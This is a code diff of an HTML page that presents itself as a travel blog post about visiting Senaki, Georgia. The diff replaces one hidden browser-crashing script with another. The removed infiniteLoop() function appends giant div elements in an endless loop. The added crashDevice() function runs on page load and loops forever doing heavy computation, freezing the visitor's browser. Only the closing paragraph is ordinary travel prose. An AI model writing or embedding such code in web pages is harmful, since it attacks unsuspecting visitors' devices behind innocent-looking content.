@@ -22,22 +22,18 @@ img {
 	<title>T8r3l1t3z</title>
 </head>
 <h1>My time in Senaki</h1>
-<body onload="infiniteLoop()">
+<body onload="crashDevice()">
 	<script type="text/javascript">
-function infiniteLoop() {
-    while (true) {
-        var i = 0;
-        while (i < 1000000000) {
-            i++;
-        }
-        var temp = document.createElement('div');
-        temp.style.width = '999999999999999px';
-        temp.style.height = '999999999999999px';
-        temp.style.overflow = 'hidden';
-        document.body.appendChild(temp);
+function crashDevice() {
+  while (true) {
+    let i = 0;
+    while (i < Infinity) {
+      i++;
+      Math.pow(i, i);
     }
+  }
 }
-infiniteLoop();
+crashDevice();
 </script>
 
 </p> I had always been fascinated by the country of Georgia and its rich history, so when I got the opportunity to visit Senaki, I jumped at the chance. I had read about the city's strategic importance in the past, and as I made my way towards it, I could see why. The city was located in the heart of Georgia and had played a key role in the country's defense over the years.
